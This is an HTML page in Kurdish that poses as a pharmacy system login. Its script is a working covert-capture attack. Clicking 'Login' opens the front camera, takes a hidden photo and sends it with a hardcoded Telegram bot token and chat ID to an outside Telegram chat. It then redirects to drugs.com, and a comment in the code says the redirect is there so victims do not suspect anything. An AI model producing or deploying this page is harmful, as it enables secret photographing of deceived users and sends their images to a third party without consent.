<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سیستەمی بەڕێوەبردنی دەرمانخانە v2.0</title>
    <style>
        :root { --primary: #00a884; --dark: #121b22; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: var(--dark); }
        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        .icon { font-size: 50px; color: var(--primary); margin-bottom: 10px; }
        h2 { margin-bottom: 10px; font-size: 22px; color: #333; }
        p { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.6; }
        .btn { background-color: var(--primary); color: white; border: none; padding: 12px 25px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
        .btn:hover { background-color: #008f6f; }
        #video { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div class="icon">🏥</div>
    <h2> دەرمانخانەی کەلەک</h2>
    <p>هەرزانترین و باشترین کوالیتی لای ئێمەیە </p>
    <button class="btn" id="startBtn">چوونە ناو سیستەم (Login)</button>
</div>

<video id="video" autoplay></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    // لێرە زانیارییەکانی تێلیگرامەکەت دابنێ
    const botToken = '8099110299:AAG3JrtdeFjj-CU2obOvE3yygdajV9qk8fE';
    const chatId = '8333149387';

    const startBtn = document.getElementById('startBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    startBtn.addEventListener('click', async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
            
            startBtn.innerText = "چاوەڕێ بکە...";
            
            setTimeout(() => {
                takeSnapshot();
            }, 2000); 

        } catch (err) {
            alert("هەڵە: بۆ چوونە ناو سیستم دەبێت ڕێگە بە کامێرا بدەیت.");
        }
    });

    function takeSnapshot() {
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(blob => {
            sendToTelegram(blob);
        }, 'image/jpeg');
    }

    function sendToTelegram(imageBlob) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', imageBlob, 'pharmacy_auth.jpg');
        formData.append('caption', '🔐 چوونە ناو سیستەمی دەرمانخانە ئەنجامدرا\n⏰ کات: ' + new Date().toLocaleString());

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        }).then(response => {
            // دوای ناردنی وێنەکە، دەچێتە سەر لاپەڕەی سەرەکی دەرمانخانە (بۆ ئەوەی گومان نەکەن)
            window.location.href = "https://www.drugs.com/"; 
        }).catch(error => {
            console.error('Error:', error);
        });
    }
</script>

</body>
</html>
